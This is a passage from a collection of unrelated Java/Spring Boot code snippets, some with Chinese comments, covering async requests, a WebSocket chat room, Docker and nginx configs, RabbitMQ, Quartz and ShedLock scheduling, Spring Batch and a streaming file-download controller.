				result.setResult("超时了!");
			}
		});
		result.onCompletion(new Runnable() {
			
			@Override
			public void run() {
				//完成后
				log.info("调用完成");
			}
		});
		FIXED_THREAD_POOL.execute(new Runnable() {
			
			@Override
			public void run() {
				//处理业务逻辑
				log.info("内部线程：" + Thread.currentThread().getName());
				//返回结果
				result.setResult("DeferredResult!!");
			}
		});
		return result;
	}
	
	/**
	 * 线程池
	 */
    public static ExecutorService FIXED_THREAD_POOL = Executors.newFixedThreadPool(30);
    
    
    @RequestMapping("/webAsyncTask")
    public WebAsyncTask<String> webAsyncTask() {
    	log.info("外部线程：" + Thread.currentThread().getName());
    	WebAsyncTask<String> result = new WebAsyncTask<String>(60*1000L, new Callable<String>() {

			@Override
			public String call() throws Exception {
				log.info("内部线程：" + Thread.currentThread().getName());
				return "WebAsyncTask!!!";
			}
		});
    	result.onTimeout(new Callable<String>() {
			
			@Override
			public String call() throws Exception {
				// TODO Auto-generated method stub
				return "WebAsyncTask超时!!!";
			}
		});
    	result.onCompletion(new Runnable() {
			
			@Override
			public void run() {
				//超时后 也会执行此方法
				log.info("WebAsyncTask执行结束");
			}
		});
    	return result;
    }
}

import javax.servlet.AsyncContext;
import javax.servlet.AsyncEvent;
import javax.servlet.AsyncListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import lombok.extern.slf4j.Slf4j;

/**
 * 使用servlet方式进行异步请求
 * @author oKong
 *
 */
@Slf4j
@RestController
public class ServletController {
	
	@RequestMapping("/servlet/orig")
	public void todo(HttpServletRequest request,
            HttpServletResponse response) throws Exception {
		//这里来个休眠
		Thread.sleep(100);
		response.getWriter().println("这是【正常】的请求返回");
	}
	
	@RequestMapping("/servlet/async")
	public void todoAsync(HttpServletRequest request,
            HttpServletResponse response) {
		AsyncContext asyncContext = request.startAsync();
		asyncContext.addListener(new AsyncListener() {
			
			@Override
			public void onTimeout(AsyncEvent event) throws IOException {
				log.info("超时了：");
				//做一些超时后的相关操作
				
			}
			
			@Override
			public void onStartAsync(AsyncEvent event) throws IOException {
				// TODO Auto-generated method stub
				log.info("线程开始");
			}
			
			@Override
			public void onError(AsyncEvent event) throws IOException {
				log.info("发生错误：",event.getThrowable());
				
			}
			
			@Override
			public void onComplete(AsyncEvent event) throws IOException {
				log.info("执行完成");
				//这里可以做一些清理资源的操作
				
			}
		});
		//设置超时时间
		asyncContext.setTimeout(200);
		//也可以不使用start 进行异步调用
//		new Thread(new Runnable() {
//			
//			@Override
//			public void run() {
//				编写业务逻辑
//				
//			}
//		}).start();
		
		asyncContext.start(new Runnable() {			
			@Override
			public void run() {
				try {
					Thread.sleep(100);
					log.info("内部线程：" + Thread.currentThread().getName());
					asyncContext.getResponse().setCharacterEncoding("utf-8");
					asyncContext.getResponse().setContentType("text/html;charset=UTF-8");
					asyncContext.getResponse().getWriter().println("这是【异步】的请求返回");
				} catch (Exception e) {
					log.error("异常：",e);
				}
				//异步请求完成通知
				//此时整个请求才完成
				//其实可以利用此特性 进行多条消息的推送 把连接挂起。。
				asyncContext.complete();
			}
		});
		//此时之类 request的线程连接已经释放了
		log.info("线程：" + Thread.currentThread().getName());
	}

}
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.web.socket.config.annotation.EnableWebSocket;
import org.springframework.web.socket.server.standard.ServerEndpointExporter;

import lombok.extern.slf4j.Slf4j;

@SpringBootApplication
@EnableWebSocket
@Slf4j
public class Chapter19Application {

	public static void main(String[] args) {
		SpringApplication.run(Chapter19Application.class, args);
		log.info("Chapter19启动!");
	}
	
	/**
	 * 会自动注册使用了@ServerEndpoint注解声明的Websocket endpoint
	 * 要注意，如果使用独立的servlet容器，
	 * 而不是直接使用springboot的内置容器，
	 * 就不要注入ServerEndpointExporter，因为它将由容器自己提供和管理。
	 */
	@Bean
	public ServerEndpointExporter serverEndpointExporter() {
		return new ServerEndpointExporter();
	}
}

import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import javax.websocket.RemoteEndpoint.Async;
import javax.websocket.Session;

public class WebSocketUtil {

	/**
	 * 简单使用map进行存储在线的session
	 * 
	 */
    private static final Map<String, Session> ONLINE_SESSION = new ConcurrentHashMap<>();
    
    public static void addSession(String userNick,Session session) {
    	//putIfAbsent 添加键—值对的时候，先判断该键值对是否已经存在
    	//不存在：新增，并返回null
    	//存在：不覆盖，直接返回已存在的值
//    	ONLINE_SESSION.putIfAbsent(userNick, session);
    	//简单示例 不考虑复杂情况。。怎么简单怎么来了。。
    	ONLINE_SESSION.put(userNick, session);
    }
    
    public static void remoteSession(String userNick) {
    	ONLINE_SESSION.remove(userNick);
    }
    
    /**
     * 向某个用户发送消息
     * @param session 某一用户的session对象
     * @param message
     */
    public static void sendMessage(Session session, String message) {
    	if(session == null) {
    		return;
    	}
    	// getAsyncRemote()和getBasicRemote()异步与同步
    	Async async = session.getAsyncRemote();
    	//发送消息
    	async.sendText(message);
    }
    
    /**
     * 向所有在线人发送消息
     * @param message
     */
    public static void sendMessageForAll(String message) {
    	//jdk8 新方法
    	ONLINE_SESSION.forEach((sessionId, session) -> sendMessage(session, message));
    }
}

import java.io.IOException;

import javax.websocket.OnClose;
import javax.websocket.OnError;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.server.PathParam;
import javax.websocket.server.ServerEndpoint;

import org.springframework.stereotype.Component;

import lombok.extern.slf4j.Slf4j;

/**
 * websocket 简易聊天
 * @author oKong
 *
 */
//由于是websocket 所以原本是@RestController的http形式 
//直接替换成@ServerEndpoint即可，作用是一样的 就是指定一个地址
//表示定义一个websocket的Server端
@Component
@ServerEndpoint(value = "/my-chat/{usernick}")
@Slf4j
public class WebSocketController {
	
	/**
	 * 连接事件 加入注解
	 * @param session
	 */
	@OnOpen
	public void onOpen(@PathParam(value = "usernick") String userNick,Session session) {
		String message = "有新游客[" + userNick + "]加入聊天室!";
		log.info(message);
		WebSocketUtil.addSession(userNick, session);	
		//此时可向所有的在线通知 某某某登录了聊天室			
		WebSocketUtil.sendMessageForAll(message);
	}
	
	@OnClose
	public void onClose(@PathParam(value = "usernick") String userNick,Session session) {
		String message = "游客[" + userNick + "]退出聊天室!";
		log.info(message);
		WebSocketUtil.remoteSession(userNick);	
		//此时可向所有的在线通知 某某某登录了聊天室			
		WebSocketUtil.sendMessageForAll(message);
	}
	
	@OnMessage
	public void OnMessage(@PathParam(value = "usernick") String userNick, String message) {
		//类似群发
		String info = "游客[" + userNick + "]：" + message;
		log.info(info);
		WebSocketUtil.sendMessageForAll(info);
	} 
	
	@OnError
	public void onError(Session session, Throwable throwable) {
		log.error("异常:", throwable);
		try {
			session.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		throwable.printStackTrace();
	}
}

    @Override
    public void addArgumentResolvers(List<HandlerMethodArgumentResolver> argumentResolvers) {
        super.addArgumentResolvers(argumentResolvers);
        ObjectMapper objectMapper = Jackson2ObjectMapperBuilder.json().applicationContext(this.applicationContext).build();
        argumentResolvers.add(new DTOModelMapper(objectMapper, entityManager));
    }
--------------------------------------------------------------------------------------------------------
    @Bean
    public ServletRegistrationBean servletRegistrationBean() {
        FacesServlet servlet = new FacesServlet();
        return new ServletRegistrationBean(servlet, "*.jsf");
    }

    @Bean
    public FilterRegistrationBean rewriteFilter() {
        FilterRegistrationBean rwFilter = new FilterRegistrationBean(new RewriteFilter());
        rwFilter.setDispatcherTypes(EnumSet.of(DispatcherType.FORWARD, DispatcherType.REQUEST,
                DispatcherType.ASYNC, DispatcherType.ERROR));
        rwFilter.addUrlPatterns("/*");
        return rwFilter;
    }
--------------------------------------------------------------------------------------------------------
FROM frolvlad/alpine-oraclejdk8:slim
VOLUME /tmp
ADD target/spring-session-0.1-SNAPSHOT.jar /app.jar
RUN sh -c 'touch /app.jar'
ENV JAVA_OPTS=""
ENTRYPOINT [ "sh", "-c", "java $JAVA_OPTS -Djava.security.egd=file:/dev/./urandom -jar /app.jar" ]

FROM redis
ENV REDIS_PASSWORD secret
CMD ["sh", "-c", "exec redis-server --requirepass \"$REDIS_PASSWORD\""]

FROM nginx
RUN rm /etc/nginx/conf.d/default.conf
COPY nginx.conf /etc/nginx/conf.d/default.conf

upstream my-app {
    server 172.17.0.1:8081 weight=1;
    server 172.17.0.1:8082 weight=1;
}

server {
    location / {
        proxy_pass http://my-app;
    }
}
--------------------------------------------------------------------------------------------------------
minicom -D /dev/ttyACM0 #macOS should be /dev/tty.usbserial or similar
--------------------------------------------------------------------------------------------------------
import org.apache.catalina.startup.Tomcat;

import java.io.File;
import java.io.IOException;

public class Main {
    private static final int PORT = 8080;

    public static void main(String[] args) throws Exception {
        String appBase = ".";
        Tomcat tomcat = new Tomcat();
        tomcat.setBaseDir(createTempDir());
        tomcat.setPort(PORT);
        tomcat.getHost().setAppBase(appBase);
        tomcat.addWebapp("", appBase);
        tomcat.start();
        tomcat.getServer().await();
    }

    // based on AbstractEmbeddedServletContainerFactory
    private static String createTempDir() {
        try {
            File tempDir = File.createTempFile("tomcat.", "." + PORT);
            tempDir.delete();
            tempDir.mkdir();
            tempDir.deleteOnExit();
            return tempDir.getAbsolutePath();
        } catch (IOException ex) {
            throw new RuntimeException(
                    "Unable to create tempDir. java.io.tmpdir is set to " + System.getProperty("java.io.tmpdir"),
                    ex
            );
        }
    }
}
--------------------------------------------------------------------------------------------------------
import com.auth0.spring.security.api.JwtWebSecurityConfigurer;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.config.http.SessionCreationPolicy;

@EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
    private static final String TOKEN_AUDIENCE = "spring5";
    private static final String TOKEN_ISSUER = "https://bkrebs.auth0.com/";
    private static final String API_ENDPOINT = "/api/**";
    private static final String PUBLIC_URLS = "/**";

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        JwtWebSecurityConfigurer
                .forRS256(TOKEN_AUDIENCE, TOKEN_ISSUER)
                .configure(http)
                .authorizeRequests()
                .mvcMatchers(API_ENDPOINT).fullyAuthenticated()
                .mvcMatchers(PUBLIC_URLS).permitAll()
                .anyRequest().authenticated().and()
                .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS);
    }
}
--------------------------------------------------------------------------------------------------------
IntStream.of(1, 2, 3, 5, 6, 7)
          .filter((var i) -> i % 3 == 0)
          .forEach(System.out::println);
--------------------------------------------------------------------------------------------------------
# rabbitmq相关配置
spring.rabbitmq.host=127.0.0.1
spring.rabbitmq.port=5672
spring.rabbitmq.username=guest
spring.rabbitmq.password=guest
--------------------------------------------------------------------------------------------------------
import org.springframework.amqp.rabbit.annotation.RabbitHandler;
import org.springframework.amqp.rabbit.annotation.RabbitListener;
import org.springframework.stereotype.Component;

import lombok.extern.slf4j.Slf4j;

@Component
//@RabbitListener 监听 okong 队列
@RabbitListener(queues = "okong")
@Slf4j
public class Consumer {

	/**
	 * @RabbitHandler 指定消息的处理方法
	 * @param message
	 */
	@RabbitHandler
	public void process(String message) {
        log.info("接收的消息为: {}", message);
    }
}
--------------------------------------------------------------------------------------------------------
import org.quartz.DisallowConcurrentExecution;
import org.quartz.JobDataMap;
import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.web.reactive.function.client.WebClient;

import cn.lqdev.java.scheduler.biz.entity.SchedConfig;
import lombok.extern.slf4j.Slf4j;
import reactor.core.publisher.Mono;

/** 
*
* @ClassName   类名：TaskJob 
* @Description 功能说明：
* <p>
* TODO
*</p>
************************************************************************
* @date        创建日期：2019年3月4日
* @author      创建人：oKong
* @version     版本号：V1.0
*<p>
***************************修订记录*************************************
* 
*   2019年3月4日   oKong   创建该类功能。
*
***********************************************************************
*</p>
*/
//@DisallowConcurrentExecution 说明在一个任务执行时，另一个定时点来临时不会执行任务，比如一个定时是间隔3分钟一次，但任务执行了5分钟，此时会等上个任务完成后再执行下一次定时任务
@DisallowConcurrentExecution
@Slf4j
public class TaskJob implements org.quartz.Job{
	
	/**
	 * spring5中 异步restTemplate已被标记位作废了
	 * 这里尝试使用webClient
	 */ 
	@Autowired
	@Qualifier("balanceWebClient")
	private WebClient.Builder balanceWebClientBuilder;
	
	@Autowired
	@Qualifier("webClient")
	private WebClient.Builder webClientBuilder;
	
	
	@Override
	public void execute(JobExecutionContext context) throws JobExecutionException {
		//执行方法
		//获取任务实体对象
		JobDataMap jobDataMap = context.getJobDetail().getJobDataMap();
		SchedConfig schedConfig = (SchedConfig) jobDataMap.get("config");
		log.info("执行定时任务：{}", schedConfig);
		//根据不同类型进行不同的处理逻辑
		Mono<String> monoRst = null;
		switch (schedConfig.getTargetServiceType()) {
		case "01":
			//springcloud方式
			//利用loadBalancerClient 获取实际服务地址
			monoRst = balanceWebClientBuilder.build().post().uri(schedConfig.getTargerService()).retrieve().bodyToMono(String.class);
			 break;
		case "02":
			//普通http方式
			monoRst =webClientBuilder.build().post().uri(schedConfig.getTargerService()).retrieve().bodyToMono(String.class);//无参数
			break;
		case "03":
			//dubbo方式
			//TODO 暂时未实现
			break;
		default:

		}
		if(monoRst != null) {
		  log.info("调用服务结果为：{}", monoRst.block());
		}
	}

}


import org.quartz.spi.TriggerFiredBundle;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.config.AutowireCapableBeanFactory;
import org.springframework.scheduling.quartz.AdaptableJobFactory;

/**
 *
 * @ClassName 类名：QuartzJobFactory
 * @Description 功能说明：对执行的job字段进行自动注入
 *              <p>
 *              TODO
 *              </p>
 ************************************************************************
 * @date 创建日期：2019年3月4日
 * @author 创建人：oKong
 * @version 版本号：V1.0
 *          <p>
 ***************************          修订记录*************************************
 * 
 *          2019年3月4日 oKong 创建该类功能。
 *
 ***********************************************************************
 *          </p>
 */
public class QuartzJobFactory extends AdaptableJobFactory {
	@Autowired
	private AutowireCapableBeanFactory capableBeanFactory;

	protected Object createJobInstance(TriggerFiredBundle bundle) throws Exception {
		// 调用父类的方法
		Object jobInstance = super.createJobInstance(bundle);
		//主动注入
		capableBeanFactory.autowireBean(jobInstance);
		return jobInstance;
	}
}

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.quartz.SchedulerFactoryBean;

/** 
*
* @ClassName   类名：QuartzConfig 
* @Description 功能说明：quartz配置，主要设置SchedulerFactoryBean
* <p>
* TODO
*</p>
************************************************************************
* @date        创建日期：2019年3月5日
* @author      创建人：oKong
* @version     版本号：V1.0
*<p>
***************************修订记录*************************************
* 
*   2019年3月5日   oKong   创建该类功能。
*
***********************************************************************
*</p>
*/
@Configuration
public class QuartzConfig {
	
	@Bean
    public SchedulerFactoryBean schedulerFactoryBean(){
        SchedulerFactoryBean factory = new SchedulerFactoryBean();
        factory.setOverwriteExistingJobs(true);
        // 延时启动
        factory.setStartupDelay(20);
        // 自定义Job Factory，用于Spring注入
        factory.setJobFactory(quartzJobFactory());
        return factory;
    }
	
	@Bean
	public QuartzJobFactory quartzJobFactory() {
		return new QuartzJobFactory();
	
--------------------------------------------------------------------------------------------------------
spring.application.name=shedlock-demo
server.port=8001

# REDIS (RedisProperties)
# Redis数据库索引（默认为0）
spring.redis.database=0
# Redis服务器地址
spring.redis.host=127.0.0.1
# Redis服务器连接端口
spring.redis.port=6379  
# Redis服务器连接密码（默认为空）
#spring.redis.password=
# 连接池最大连接数（使用负值表示没有限制）
spring.redis.lettuce.pool.max-active=8  
# 连接池最大阻塞等待时间（使用负值表示没有限制）Duration
spring.redis.lettuce.pool.max-wait=-1ms 
# 连接池中的最大空闲连接
spring.redis.lettuce.pool.max-idle=8  
# 连接池中的最小空闲连接
spring.redis.lettuce.pool.min-idle=0  
# 连接超时时间-Duration 不能设置为0 一般上设置个200ms
spring.redis.timeout=200ms

#spring.profiles.active=dev

#指定注册中心地址
eureka.client.service-url.defaultZone=http://127.0.0.1:1000/eureka
# 启用ip配置 这样在注册中心列表中看见的是以ip+端口呈现的
eureka.instance.prefer-ip-address=true
# 实例名称  最后呈现地址：ip:2000
eureka.instance.instance-id=${spring.cloud.client.ip-address}:${server.port}
--------------------------------------------------------------------------------------------------------
import java.util.Date;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import lombok.extern.slf4j.Slf4j;
import net.javacrumbs.shedlock.core.SchedulerLock;

/** 
*
* @ClassName   类名：SimpleTask 
* @Description 功能说明：
* <p>
* TODO
*</p>
************************************************************************
* @date        创建日期：2019年3月3日
* @author      创建人：oKong
* @version     版本号：V1.0
*<p>
***************************修订记录*************************************
* 
*   2019年3月3日   oKong   创建该类功能。
*
***********************************************************************
*</p>
*/
//@Component
@Slf4j
public class SimpleTask {
	
	//区分服务
	@Value("${server.port}")
	String port;
	
	//为了方便测试 设置cron表达式 
	@Scheduled(cron = "*/5 * * * * ?")
	//lockAtLeastFor：保证在设置的期间类不执行多次任务，单位是毫秒，此处可以根据实际任务运行情况进行设置，
	//简单来说，一个每15分钟执行的任务，若每次任务执行的时间为几分钟，则可以设置lockAtLeastFor大于其最大估计最大执行时间
	//避免一次任务未执行完，下一个定时任务又启动了。
	//任务执行完，会自动释放锁。
	@SchedulerLock(name="simpleTask",lockAtLeastFor = 1*1000)
	public void getCurrentDate() {
        log.info("端口({}),Scheduled定时任务执行：{}", port, new Date());
    }
}

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.redis.connection.RedisConnectionFactory;

import net.javacrumbs.shedlock.core.LockProvider;
import net.javacrumbs.shedlock.provider.redis.spring.RedisLockProvider;
import net.javacrumbs.shedlock.spring.annotation.EnableSchedulerLock;

/** 
*
* @ClassName   类名：ShedLockRedisConfig 
* @Description 功能说明：redis配置
* <p>
* TODO
*</p>
************************************************************************
* @date        创建日期：2019年3月3日
* @author      创建人：oKong
* @version     版本号：V1.0
*<p>
***************************修订记录*************************************
* 
*   2019年3月3日   oKong   创建该类功能。
*
***********************************************************************
*</p>
*/
@Configuration
//defaultLockAtMostFor 指定在执行节点结束时应保留锁的默认时间使用ISO8601 Duration格式
//作用就是在被加锁的节点挂了时，无法释放锁，造成其他节点无法进行下一任务
//这里默认30s
//关于ISO8601 Duration格式用的不到，具体可上网查询下相关资料，应该就是一套规范，规定一些时间表达方式
@EnableSchedulerLock(defaultLockAtMostFor = "PT30S")
public class ShedLockRedisConfig {
	
	//正常情况下 应该按实际环境来区分的
	//这里为了方便 写成test便于是测试
//	@Value("${spring.profiles.active}")
	String env = "test";
	
	@Bean
	public LockProvider lockProvider(RedisConnectionFactory connectionFactory) {
		//环境变量 -需要区分不同环境避免冲突，如dev环境和test环境，两者都部署时，只有一个实例进行，此时会造成相关环境未启动情况
	    return new RedisLockProvider(connectionFactory, env);
	}
}
--------------------------------------------------------------------------------------------------------
spring.datasource.url=jdbc:h2:mem:batchdb
spring.datasource.driverClassName=org.h2.Driver
spring.datasource.username=sa
spring.datasource.password=password
spring.jpa.database-platform=org.hibernate.dialect.H2Dialect
spring.h2.console.enabled=true
--------------------------------------------------------------------------------------------------------
    @GenericGenerator (name="uuid", strategy="org.hibernate.id.UUIDGenerator")
--------------------------------------------------------------------------------------------------------
public class ReflectionWithPublicFieldSingleton {

    public static void main(String[] args) {

        Singleton instance1 = Singleton.getInstance();

        Singleton instance2 = null;

        try {

            Field instance = Singleton.class.getDeclaredField("instance");
            instance.setAccessible(true);
            instance.set(instance, null);

            Constructor[] cstr = Singleton.class.getDeclaredConstructors();

            for (Constructor constructor: cstr) {

                //Setting constructor accessible

                constructor.setAccessible(true);

                instance2 = (Singleton) constructor.newInstance();

                break;

            }

        } catch (Exception e) {

            System.out.println(e);

        }

        System.out.println(instance1.hashCode());

        System.out.println(instance2.hashCode());

    }
}
--------------------------------------------------------------------------------------------------------

import com.techshard.batch.dao.entity.Voltage;
import org.springframework.batch.core.Job;
import org.springframework.batch.core.Step;
import org.springframework.batch.core.configuration.annotation.EnableBatchProcessing;
import org.springframework.batch.core.configuration.annotation.JobBuilderFactory;
import org.springframework.batch.core.configuration.annotation.StepBuilderFactory;
import org.springframework.batch.core.launch.support.RunIdIncrementer;
import org.springframework.batch.item.database.BeanPropertyItemSqlParameterSourceProvider;
import org.springframework.batch.item.database.JdbcBatchItemWriter;
import org.springframework.batch.item.database.builder.JdbcBatchItemWriterBuilder;
import org.springframework.batch.item.file.FlatFileItemReader;
import org.springframework.batch.item.file.LineMapper;
import org.springframework.batch.item.file.builder.FlatFileItemReaderBuilder;
import org.springframework.batch.item.file.mapping.BeanWrapperFieldSetMapper;
import org.springframework.batch.item.file.mapping.DefaultLineMapper;
import org.springframework.batch.item.file.transform.DelimitedLineTokenizer;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.ClassPathResource;

import javax.sql.DataSource;

@Configuration
@EnableBatchProcessing
public class BatchConfiguration {

    @Autowired
    public JobBuilderFactory jobBuilderFactory;

    @Autowired
    public StepBuilderFactory stepBuilderFactory;

    @Bean
    public FlatFileItemReader<Voltage> reader() {
        return new FlatFileItemReaderBuilder<Voltage>()
                .name("voltItemReader")
                .resource(new ClassPathResource("Volts.csv"))
                .delimited()
                .names(new String[]{"volt", "time"})
                .lineMapper(lineMapper())
                .fieldSetMapper(new BeanWrapperFieldSetMapper<Voltage>() {{
                    setTargetType(Voltage.class);
                }})
                .build();
    }

    @Bean
    public LineMapper<Voltage> lineMapper() {

        final DefaultLineMapper<Voltage> defaultLineMapper = new DefaultLineMapper<>();
        final DelimitedLineTokenizer lineTokenizer = new DelimitedLineTokenizer();
        lineTokenizer.setDelimiter(";");
        lineTokenizer.setStrict(false);
        lineTokenizer.setNames(new String[] {"volt","time"});

        final VoltageFieldSetMapper fieldSetMapper = new VoltageFieldSetMapper();
        defaultLineMapper.setLineTokenizer(lineTokenizer);
        defaultLineMapper.setFieldSetMapper(fieldSetMapper);

        return defaultLineMapper;
    }

    @Bean
    public VoltageProcessor processor() {
        return new VoltageProcessor();
    }

    @Bean
    public JdbcBatchItemWriter<Voltage> writer(final DataSource dataSource) {
        return new JdbcBatchItemWriterBuilder<Voltage>()
                .itemSqlParameterSourceProvider(new BeanPropertyItemSqlParameterSourceProvider<>())
                .sql("INSERT INTO voltage (volt, time) VALUES (:volt, :time)")
                .dataSource(dataSource)
                .build();
    }

    @Bean
    public Job importVoltageJob(NotificationListener listener, Step step1) {
        return jobBuilderFactory.get("importVoltageJob")
                .incrementer(new RunIdIncrementer())
                .listener(listener)
                .flow(step1)
                .end()
                .build();
    }

    @Bean
    public Step step1(JdbcBatchItemWriter<Voltage> writer) {
        return stepBuilderFactory.get("step1")
                .<Voltage, Voltage> chunk(10)
                .reader(reader())
                .processor(processor())
                .writer(writer)
                .build();
    }
}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.controller.impl;

import com.google.common.io.ByteStreams;
import com.paragon.mailingcontour.commons.security.model.AuthenticatedUser;
import com.paragon.microservices.distributor.controller.interfaces.DownloadController;
import com.paragon.microservices.distributor.model.domain.*;
import com.paragon.microservices.distributor.model.dto.response.DownloadLinkResponse;
import com.paragon.microservices.distributor.model.enumeration.DownloadStatus;
import com.paragon.microservices.distributor.service.interfaces.DownloadService;
import com.paragon.microservices.distributor.service.interfaces.FileService;
import com.paragon.microservices.distributor.service.interfaces.FileTransferService;
import com.paragon.microservices.distributor.system.configuration.DelegatedModelMapper;
import lombok.AccessLevel;
import lombok.EqualsAndHashCode;
import lombok.Getter;
import lombok.ToString;
import lombok.extern.slf4j.Slf4j;
import org.apache.tomcat.util.http.fileupload.IOUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationEventPublisher;
import org.springframework.context.MessageSource;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.util.UUID;
import java.util.function.Consumer;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static com.paragon.mailingcontour.commons.exception.ResourceNotFoundException.throwResourceNotFound;
import static com.paragon.microservices.distributor.controller.interfaces.BaseController.ResourceEndpoint.DOWNLOAD_RESOURCE_ENDPOINT;
import static com.paragon.microservices.distributor.service.impl.BaseServiceImpl.ERROR_RESOURCE_NOT_FOUND;
import static com.paragon.microservices.distributor.system.utils.HeaderUtils.getDisableCacheHeader;
import static com.paragon.microservices.distributor.system.utils.HeaderUtils.getFileDownloadHeaders;

/**
 * {@link DownloadController} implementation
 */
@Slf4j
@EqualsAndHashCode(callSuper = true)
@ToString(callSuper = true)
@Getter(AccessLevel.PROTECTED)
@RestController
@Validated
@Transactional(rollbackFor = Exception.class, readOnly = true)
@RequestMapping(
        value = DOWNLOAD_RESOURCE_ENDPOINT,
        produces = {MediaType.APPLICATION_JSON_UTF8_VALUE}
)
public class DownloadControllerImpl extends BaseControllerImpl implements DownloadController {
    private final DelegatedModelMapper modelMapper;
    private final ApplicationEventPublisher eventPublisher;
    private final DownloadService downloadService;
    private final FileTransferService fileTransferService;
    private final FileService fileService;

    @Autowired
    public DownloadControllerImpl(final MessageSource messageSource,
                                  final DelegatedModelMapper modelMapper,
                                  final ApplicationEventPublisher eventPublisher,
                                  final DownloadService downloadService,
                                  final FileTransferService fileTransferService,
                                  final FileService fileService) {
        super(messageSource);
        this.modelMapper = modelMapper;
        this.downloadService = downloadService;
        this.fileTransferService = fileTransferService;
        this.fileService = fileService;
        this.eventPublisher = eventPublisher;
    }

    @GetMapping(params = {"binaryId"})
    @Override
    public ResponseEntity<DownloadLinkResponse> generateDownloadLinkByIds(final UUID productId,
                                                                          final UUID versionId,
                                                                          final UUID binaryId,
                                                                          final AuthenticatedUser authenticatedUser) {
        final IdentityFileSearchParameters searchParameters = IdentityFileSearchParameters.of(productId, versionId, binaryId, authenticatedUser.getUserId());
        return Stream.of(searchParameters)
                .map(params -> this.getDownloadService().generateDownloadLink(params))
                .flatMap(this::getDownloadResponse)
                .findFirst()
                .orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_NOT_FOUND, searchParameters));
    }

    @GetMapping(params = {"sku", "locale", "platform"})
    @Override
    public ResponseEntity<DownloadLinkResponse> generateDownloadLinkByNames(final String sku,
                                                                            final String version,
                                                                            final String locale,
                                                                            final String platform,
                                                                            final AuthenticatedUser authenticatedUser) {
        final NamingFileSearchParameters searchParameters = NamingFileSearchParameters.of(sku, version, locale, platform, authenticatedUser.getUserId());
        return Stream.of(searchParameters)
                .map(params -> this.getDownloadService().generateDownloadLink(params))
                .flatMap(this::getDownloadResponse)
                .findFirst()
                .orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_NOT_FOUND, searchParameters));
    }

    private Stream<ResponseEntity<DownloadLinkResponse>> getDownloadResponse(final DownloadLink downloadLink) {
        return Stream.of(downloadLink)
                .map(entity -> this.getModelMapper().map(entity, DownloadLinkResponse.class))
                .map(result -> buildBodyHeaderResponse(getDisableCacheHeader(), result));
    }

    @GetMapping("/{sessionId}/{fileName}")
    @Override
    public ResponseEntity<StreamingResponseBody> getResourceAsStream(@PathVariable final UUID sessionId,
                                                                     @PathVariable final String fileName) {
        return Stream.of(sessionId)
                .map(id -> this.getFileTransferService().getFileData(id))
                .map(fileData -> ResponseEntity.ok()
                        .headers(getFileDownloadHeaders(fileData.getFileMetaData()))
                        .body(this.toByteStreamResponseBody(fileData))
                )
                .findFirst()
                .get();
    }

    private StreamingResponseBody toByteStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
            try {
                ByteStreams.copy(fileData.getFileStream(), outputStream);
                outputStream.flush();
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (final IOException ex) {
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private StreamingResponseBody toZipStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
            final ZipOutputStream zipOut = new ZipOutputStream(outputStream);
            try {
                final ZipEntry zipEntry = new ZipEntry(fileData.getFileMetaData().getFileName());
                zipOut.putNextEntry(zipEntry);

                final byte[] bytes = new byte[1024];
                int length;
                while ((length = fileData.getFileStream().read(bytes)) >= 0) {
                    zipOut.write(bytes, 0, length);
                }
                fileData.getFileStream().close();
                zipOut.close();
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (final IOException ex) {
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private StreamingResponseBody toBufferedStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
